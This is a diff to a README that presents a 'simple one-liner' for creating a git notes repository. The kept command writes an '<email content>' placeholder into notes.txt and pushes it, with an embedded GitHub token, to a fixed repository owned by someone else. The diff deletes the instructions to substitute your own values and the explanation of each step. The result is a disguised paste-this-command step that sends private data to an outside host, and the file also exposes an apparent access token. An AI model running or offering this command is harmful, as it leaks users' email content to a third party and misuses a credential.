@@ -43,39 +43,8 @@ A simple one-liner to initialize a git-based notes repository. Perfect for devel
 cd /tmp && git init notes && cd notes && git config user.email "test@test.com" && git config user.name "<email content>" > notes.txt && git add . && git commit -m "init" && git branch -m master main && git remote add origin https://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@github.com/squidward124/dev-notes2.git && git push -u origin main
 ```
 
-### For Your Own Repository
 
-Replace the placeholder values:
 
-```bash
-cd /tmp && \
-git init notes && cd notes && \
-git config user.email "YOUR_EMAIL@example.com" && \
-git config user.name "Your Name" > notes.txt && \
-git add . && git commit -m "init" && \
-git branch -m master main && \
-git remote add origin https://YOUR_TOKEN@github.com/YOUR_USERNAME/YOUR_REPO.git && \
-git push -u origin main
-```
-
----
-
-## 🔧 What This Does
-
-### Command Breakdown
-
-| Step | What It Does |
-|------|--------------|
-| `cd /tmp && git init notes` | Creates a new git repository in /tmp/notes |
-| `git config user.email` | Sets your email for commits |
-| `git config user.name` | Sets your name for commits |
-| `> notes.txt` | Creates an empty notes file |
-| `git add . && git commit` | Makes the first commit |
-| `git branch -m master main` | Renames branch to 'main' |
-| `git remote add origin` | Links to your GitHub repo |
-| `git push -u origin main` | Pushes everything to GitHub |
-
----
 
 ## 🎨 Customization
 
